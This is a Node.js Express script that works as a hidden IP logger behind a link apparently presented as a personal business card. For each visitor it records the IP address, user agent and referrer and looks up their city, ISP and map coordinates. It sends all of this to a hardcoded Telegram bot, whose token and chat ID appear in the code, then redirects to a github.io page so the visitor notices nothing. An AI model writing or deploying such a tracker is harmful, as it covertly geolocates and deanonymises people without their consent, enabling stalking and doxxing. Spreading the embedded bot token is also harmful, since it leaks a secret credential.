const express = require('express');
const fetch = require('node-fetch');
const app = express();

const TG_TOKEN = '8619933114:AAFFa4SN6gAMuiJctEXl4RjJBqXV_xmxBHA';
const TG_CHATID = '6120144391';

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';

  let geo = {};
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,lat,lon`);
    geo = await r.json();
  } catch(e) {}

  const now = new Date().toLocaleString('ru-RU', {timeZone:'Europe/Moscow'});
  const mapsLink = geo.lat ? `https://maps.google.com/?q=${geo.lat},${geo.lon}` : null;

  const text = [
    `👁 <b>Новый переход на визитку</b>`,
    `🕐 <b>Время:</b> ${now} (МСК)`,
    ``,
    `🌐 <b>IP:</b> <code>${ip}</code>`,
    `📍 <b>Город:</b> ${geo.city||'—'}, ${geo.regionName||'—'}`,
    `🏳 <b>Страна:</b> ${geo.country||'—'}`,
    `🏢 <b>Провайдер:</b> ${geo.isp||'—'}`,
    mapsLink ? `🗺 <b>На карте:</b> <a href="${mapsLink}">Открыть</a>` : '',
    ``,
    `📱 <b>Устройство:</b> ${ua}`,
    `📨 <b>Реферер:</b> ${req.headers['referer']||'прямой переход'}`,
  ].filter(Boolean).join('\n');

  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({chat_id: TG_CHATID, text, parse_mode:'HTML', disable_web_page_preview:true})
  });

  res.redirect('https://mamkagde-ops.github.io/Vizitka/');
});

app.listen(process.env.PORT || 3000);
